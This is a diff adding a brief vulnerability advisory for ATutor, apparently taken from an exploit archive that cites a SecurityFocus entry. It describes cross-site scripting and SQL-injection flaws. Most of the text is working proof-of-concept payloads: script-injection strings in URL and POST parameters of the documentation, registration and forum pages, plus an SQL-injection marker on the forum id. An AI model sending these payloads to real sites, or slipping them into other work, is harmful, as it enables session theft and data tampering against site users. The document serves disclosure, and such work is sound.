@@ -1,0 +1,23 @@
+source: http://www.securityfocus.com/bid/18898/info
+
+ATutor is prone to multiple input-validation vulnerabilities, including cross-site scripting and SQL-injection issues, because the application fails to properly sanitize user-supplied input. 
+
+A successful exploit of these vulnerabilities could allow an attacker to compromise the application, access or modify data, steal cookie-based authentication credentials, or even exploit vulnerabilities in the underlying database implementation. Other attacks are also possible.
+
+http://www.example.com/documentation/index_list.php?lang="><script>alert(/EllipsisSecurityTest/)</script>
+POST http://www.example.com:80/registration.php?register=Register HTTP/1.0
+Accept: */*
+Content-Type: application/x-www-form-urlencoded
+Host: www.example.com
+ml=1&year="><script>alert(/EllipsisSecurityTest/)</script>
+POST http://www.example.com:80/registration.php?register=Register HTTP/1.0
+Accept: */*
+Content-Type: application/x-www-form-urlencoded
+Host: www.example.com
+ml=1&month="><script>alert(/EllipsisSecurityTest/)</script>
+POST http://www.example.com:80/registration.php?register=Register HTTP/1.0
+Accept: */*
+Content-Type: application/x-www-form-urlencoded
+Host: www.example.com
+ml=1&day="><script>alert(/EllipsisSecurityTest/)</script>
+http://www.example.com/forum/index.php?fid=-1[SQL]
